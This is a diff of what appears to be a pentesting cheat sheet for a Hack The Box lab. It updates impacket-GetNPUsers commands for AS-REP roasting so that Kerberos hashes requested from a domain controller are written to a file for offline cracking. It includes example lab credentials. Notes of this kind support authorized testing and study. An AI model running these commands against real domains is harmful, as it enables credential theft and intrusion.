@@ -77,13 +77,13 @@ Example: impacket-GetNPUsers htb.local/ -dc-ip 10.129.63.149
 
 Grab all Roastable Ticket:
 ```
-impacket-GetNPUsers <domain name>/ -dc-ip <dcip> -request -request-user ""
-Example: impacket-GetNPUsers htb.local/ -dc-ip 10.129.63.149 -request
+impacket-GetNPUsers <domain name>/ -dc-ip <dcip> -request -outputfile <fname>
+Example: impacket-GetNPUsers htb.local/ -dc-ip 10.129.63.149 -request -outputfile hash.txt
 ```
 
 Grab Specific User Ticket:
 ```
-impacket-GetNPUsers <domain name>/ -dc-ip <dcip> -request-user "<username>"
+impacket-GetNPUsers <domain name>/ -dc-ip <dcip> -request-user "<username>" -outputfile <fname>
 ```
 With Credential:
 Show all Roastable users with credential:
@@ -93,13 +93,13 @@ impacket-GetNPUsers <domain_name>/<username>:<password> -dc-ip <DC_IP_address>
 
 Grab all Roastable Ticket:
 ```
-impacket-GetNPUsers <domain_name>/<username>:<password> -dc-ip <dcip> -request -request-user ""
-Example: impacket-GetNPUsers htb.local/apple:applesauce -dc-ip 10.129.63.149 -request
+impacket-GetNPUsers <domain_name>/<username>:<password> -dc-ip <dcip> -request -outputfile <fname>
+Example: impacket-GetNPUsers htb.local/apple:applesauce -dc-ip 10.129.63.149 -request -outputfile <fname>
 ```
 
 Grab Specific User Ticket:
 ```
-impacket-GetNPUsers <domain_name>/<username>:<password> -dc-ip <dcip> -request-user "<username>"
+impacket-GetNPUsers <domain_name>/<username>:<password> -dc-ip <dcip> -request-user "<username>" -outputfile <fname>
 ```
 
 
